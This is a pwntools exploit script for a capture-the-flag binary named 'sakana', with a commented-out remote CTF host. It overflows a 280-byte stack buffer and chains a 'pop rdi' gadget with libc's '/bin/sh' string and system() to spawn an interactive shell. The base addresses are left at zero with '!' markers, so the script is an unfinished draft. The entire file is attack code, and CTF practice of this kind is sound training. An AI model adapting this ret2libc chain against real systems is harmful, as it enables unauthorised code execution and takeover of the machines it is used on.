from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'

# r = remote('ctf.adl.tw', 10003)
p = process('./sakana')

elf = ELF('./sakana')
elf_base = 0 # !
lib = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
lib_base = 0 # !
print(hex(lib.address))
print(hex(elf.address))

rop = ROP(elf)
rop.chain()
rop_gadget = elf_base + rop.find_gadget(['pop rdi', 'ret'])[0]
# print('%x'%rop.find_gadget(['pop rdi', 'ret'])[0])

sh = lib.search(b"/bin/sh\x00")
sh = next(sh)
print('%x'%sh) # 0x1b45bd

bin_sh = lib_base + sh
print('%x'%lib.symbols['execve']) # 0xe3170
print('%x'%lib.symbols['system']) # 0x52290
system_addr = lib_base + lib.symbols['system']

# payload = b'0' * 40 + p64(0x4011fb)
n = 272 + 8 # 110h + 8
payload = b'help\0' + b'a' * (n - 5) + p64(rop_gadget) + p64(bin_sh) + p64(system_addr)
# 0x23a3 (ROP gadget)
# sh
# 0x52290 system("bin/sh")

# rop.raw('/bin/sh')
# print(rop.dump())

p.recvuntil(b'!')
p.sendafter(b'~> ', payload)
# r.sendafter(b'!', payload)

# r.interactive()

p.interactive()
